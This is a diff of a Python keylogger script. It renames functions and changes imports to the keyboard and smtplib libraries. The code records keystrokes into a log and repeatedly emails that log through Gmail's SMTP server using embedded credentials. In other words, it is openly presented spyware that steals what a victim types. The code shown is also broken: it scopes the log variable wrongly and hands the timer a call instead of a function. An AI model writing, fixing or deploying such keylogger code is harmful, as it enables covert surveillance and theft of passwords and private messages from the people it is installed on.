@@ -1,11 +1,13 @@
-import pynput.keyboard, threading
+import threading
+import keyboard
+import smtplib
 
 email = ''
 password = ''
 
 log = 'Keylogger started'
 
-def processKeyPress(key):
+def process_key_press(key):
     try:
         log = log + str(key.char)
     except AttributeError:
@@ -14,11 +16,11 @@ def processKeyPress(key):
         else:
             log = log + ' ' + str(key) + ' '
 def report():
-    sendMail(email, password, log)
+    send_mail(email, password, log)
     log = ''
     timer = threading.Timer(5, report())
     timer.start()
-def sendMail(email, password, message):
+def send_mail(email, password, message):
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
     server.login(email, password)
